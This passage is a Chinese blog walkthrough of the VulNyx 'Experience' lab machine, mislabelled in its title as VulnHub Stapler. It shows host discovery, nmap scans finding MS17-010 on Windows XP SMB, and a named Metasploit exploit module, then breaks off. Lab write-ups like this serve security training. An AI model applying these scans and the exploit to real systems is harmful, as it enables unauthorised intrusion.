@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub - Stapler: 1">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/12/16/VulNyx%20-%20Experience/index.html">
+<meta property="og:site_name" content="Phantom&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-12-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-16T14:07:32.999Z">
+<meta property="article:author" content="Phantom">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="反弹 shell">
+<meta property="article:tag" content="SMB">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="MS17-010">
+<meta property="article:tag" content="CVE-2017-0143">
+<meta property="article:tag" content="VulNyx">
+<meta property="article:tag" content="MS17-010-XP">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/12/16/VulNyx%20-%20Experience/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/12/16/VulNyx%20-%20Experience/","path":"2024/12/16/VulNyx - Experience/","title":"VulnHub - Stapler: 1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VulnHub - Stapler: 1 | Phantom's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Phantom's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1. 主机探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">2. 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smb-%E6%89%AB%E6%8F%8F"><span class="nav-text">3. SMB 扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ms17-010-%E5%8F%8D%E5%BC%B9-shell"><span class="nav-text">4. MS17-010 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#msf-%E5%8F%8D%E5%BC%B9"><span class="nav-text">4.1. MSF 反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python-%E5%8F%8D%E5%BC%B9"><span class="nav-text">4.2. Python 反弹</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Phantom"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Phantom</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">182</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">170</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/12/16/VulNyx%20-%20Experience/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Phantom">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phantom's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="VulnHub - Stapler: 1 | Phantom's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulnHub - Stapler: 1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-12-16 00:00:00 / 修改时间：22:07:32" itemprop="dateCreated datePublished" datetime="2024-12-16T00:00:00+08:00">2024-12-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>9 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a target="_blank" rel="noopener" href="https://vulnyx.com/">VulNyx: Free Cybersecurity
+Platform | Enthusiasts &amp; Professionals</a></p>
+</blockquote>
+<h2 id="主机探测">1. 主机探测</h2>
+<p>示例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 10.0.3.0/24</span><br></pre></td></tr></table></figure>
+<p>靶机：10.0.3.39</p>
+<h2 id="端口扫描">2. 端口扫描</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV -sC 10.0.3.39 -p-                             </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 07:42 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.39</span><br><span class="line">Host is up (0.00085s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Windows XP microsoft-ds</span><br><span class="line">MAC Address: 08:00:27:BD:31:55 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: EXPERIENCE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:bd:31:55 (Oracle VirtualBox virtual NIC)</span><br><span class="line">|_clock-skew: mean: 20h00m00s, deviation: 5h39m24s, median: 16h00m00s</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows XP (Windows 2000 LAN Manager)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_xp::-</span><br><span class="line">|   Computer name: experience</span><br><span class="line">|   NetBIOS computer name: EXPERIENCE\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2024-12-16T20:42:58-08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 49.48 seconds</span><br></pre></td></tr></table></figure>
+<h2 id="smb-扫描">3. SMB 扫描</h2>
+<p>nmap 漏扫</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap --script &quot;safe or smb-enum-*&quot; 10.0.3.39 -p 445 -e eth1</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 07:46 EST</span><br><span class="line">Pre-scan script results:</span><br><span class="line">|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes <span class="keyword">in</span> Robtex<span class="string">&#x27;s API. See https://www.robtex.com/api/</span></span><br><span class="line"><span class="string">| broadcast-netbios-master-browser: </span></span><br><span class="line"><span class="string">|_ip  server  domain</span></span><br><span class="line"><span class="string">|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex&#x27;</span>s API. See https://www.robtex.com/api/</span><br><span class="line">| eap-info: </span><br><span class="line">| Available authentication methods with identity=<span class="string">&quot;anonymous&quot;</span> on interface eth1</span><br><span class="line">|   unknown  EAP-TTLS</span><br><span class="line">|   unknown  EAP-TLS</span><br><span class="line">|   unknown  EAP-MSCHAP-V2</span><br><span class="line">|_  unknown  PEAP</span><br><span class="line">| broadcast-dhcp-discover: </span><br><span class="line">|   Response 1 of 1: </span><br><span class="line">|     Interface: eth1</span><br><span class="line">|     IP Offered: 10.0.3.40</span><br><span class="line">|     Server Identifier: 10.0.3.3</span><br><span class="line">|     Subnet Mask: 255.255.255.0</span><br><span class="line">|     Router: 10.0.3.1</span><br><span class="line">|_    Domain Name Server: 192.168.1.1</span><br><span class="line">| targets-sniffer: Sniffed 11 address(es). </span><br><span class="line">| 224.0.0.1</span><br><span class="line">| 10.0.3.3</span><br><span class="line">| 224.0.0.9</span><br><span class="line">| 224.0.0.251</span><br><span class="line">| 239.255.255.250</span><br><span class="line">| 239.255.255.253</span><br><span class="line">| 10.0.3.39</span><br><span class="line">| 0.0.0.0</span><br><span class="line">| 224.0.0.13</span><br><span class="line">| 192.168.1.1</span><br><span class="line">|_224.0.23.12</span><br><span class="line">| targets-asn: </span><br><span class="line">|_  targets-asn.asn is a mandatory parameter</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.39</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">|_smb-enum-services: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">MAC Address: 08:00:27:BD:31:55 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| dns-blacklist: </span><br><span class="line">|   ATTACK</span><br><span class="line">|     all.bl.blocklist.de - FAIL</span><br><span class="line">|   SPAM</span><br><span class="line">|     bl.nszones.com - FAIL</span><br><span class="line">|     bl.spamcop.net - FAIL</span><br><span class="line">|     l2.apews.org - FAIL</span><br><span class="line">|     sbl.spamhaus.org - FAIL</span><br><span class="line">|     all.spamrats.com - FAIL</span><br><span class="line">|     spam.dnsbl.sorbs.net - FAIL</span><br><span class="line">|     dnsbl.inps.de - FAIL</span><br><span class="line">|     list.quorum.to - FAIL</span><br><span class="line">|   PROXY</span><br><span class="line">|     socks.dnsbl.sorbs.net - FAIL</span><br><span class="line">|     http.dnsbl.sorbs.net - FAIL</span><br><span class="line">|     misc.dnsbl.sorbs.net - FAIL</span><br><span class="line">|     dnsbl.tornevall.org - FAIL</span><br><span class="line">|_    tor.dan.me.uk - FAIL</span><br><span class="line">| unusual-port: </span><br><span class="line">|_  WARNING: this script depends on Nmap<span class="string">&#x27;s service/version detection (-sV)</span></span><br><span class="line"><span class="string">|_smb2-time: Protocol negotiation failed (SMB2)</span></span><br><span class="line"><span class="string">| smb-vuln-ms17-010: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2017-0143</span></span><br><span class="line"><span class="string">|     Risk factor: HIGH</span></span><br><span class="line"><span class="string">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span></span><br><span class="line"><span class="string">|        servers (ms17-010).</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     Disclosure date: 2017-03-14</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span></span><br><span class="line"><span class="string">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span></span><br><span class="line"><span class="string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span></span><br><span class="line"><span class="string">|_clock-skew: mean: 20h00m01s, deviation: 5h39m25s, median: 16h00m00s</span></span><br><span class="line"><span class="string">|_fcrdns: FAIL (No PTR record)</span></span><br><span class="line"><span class="string">|_ipidseq: Unknown</span></span><br><span class="line"><span class="string">| smb-protocols: </span></span><br><span class="line"><span class="string">|   dialects: </span></span><br><span class="line"><span class="string">|_    NT LM 0.12 (SMBv1) [dangerous, but default]</span></span><br><span class="line"><span class="string">|_smb2-capabilities: SMB 2+ not supported</span></span><br><span class="line"><span class="string">| smb-security-mode: </span></span><br><span class="line"><span class="string">|   account_used: &lt;blank&gt;</span></span><br><span class="line"><span class="string">|   authentication_level: user</span></span><br><span class="line"><span class="string">|   challenge_response: supported</span></span><br><span class="line"><span class="string">|_  message_signing: disabled (dangerous, but default)</span></span><br><span class="line"><span class="string">| port-states: </span></span><br><span class="line"><span class="string">|   tcp: </span></span><br><span class="line"><span class="string">|_    open: 445</span></span><br><span class="line"><span class="string">| smb-enum-shares: </span></span><br><span class="line"><span class="string">|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)</span></span><br><span class="line"><span class="string">|   account_used: &lt;blank&gt;</span></span><br><span class="line"><span class="string">|   \\10.0.3.39\ADMIN$: </span></span><br><span class="line"><span class="string">|     warning: Couldn&#x27;</span>t get details <span class="keyword">for</span> share: NT_STATUS_ACCESS_DENIED</span><br><span class="line">|     Anonymous access: &lt;none&gt;</span><br><span class="line">|   \\10.0.3.39\C$: </span><br><span class="line">|     warning: Couldn<span class="string">&#x27;t get details for share: NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string">|     Anonymous access: &lt;none&gt;</span></span><br><span class="line"><span class="string">|   \\10.0.3.39\IPC$: </span></span><br><span class="line"><span class="string">|     warning: Couldn&#x27;</span>t get details <span class="keyword">for</span> share: NT_STATUS_ACCESS_DENIED</span><br><span class="line">|_    Anonymous access: READ</span><br><span class="line">|_path-mtu: PMTU == 1500</span><br><span class="line">|_nbstat: NetBIOS name: EXPERIENCE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:bd:31:55 (Oracle VirtualBox virtual NIC)</span><br><span class="line">|_msrpc-enum: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-mbenum: </span><br><span class="line">|   Master Browser</span><br><span class="line">|     EXPERIENCE  5.1  </span><br><span class="line">|   Potential Browser</span><br><span class="line">|     EXPERIENCE  5.1  </span><br><span class="line">|   Server service</span><br><span class="line">|     EXPERIENCE  5.1  </span><br><span class="line">|   Windows NT/2000/XP/2003 server</span><br><span class="line">|     EXPERIENCE  5.1  </span><br><span class="line">|   Workstation</span><br><span class="line">|_    EXPERIENCE  5.1  </span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows XP (Windows 2000 LAN Manager)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_xp::-</span><br><span class="line">|   Computer name: experience</span><br><span class="line">|   NetBIOS computer name: EXPERIENCE\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2024-12-16T20:47:44-08:00</span><br><span class="line"></span><br><span class="line">Post-scan script results:</span><br><span class="line">| reverse-index: </span><br><span class="line">|_  445/tcp: 10.0.3.39</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 101.77 seconds</span><br></pre></td></tr></table></figure>
+<p>存在 MS17-010 漏洞</p>
+<h2 id="ms17-010-反弹-shell">4. MS17-010 反弹 Shell</h2>
+<h3 id="msf-反弹">4.1. MSF 反弹</h3>
+<p>可利用模块 <code>exploit/windows/smb/ms17_010_psexec</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span 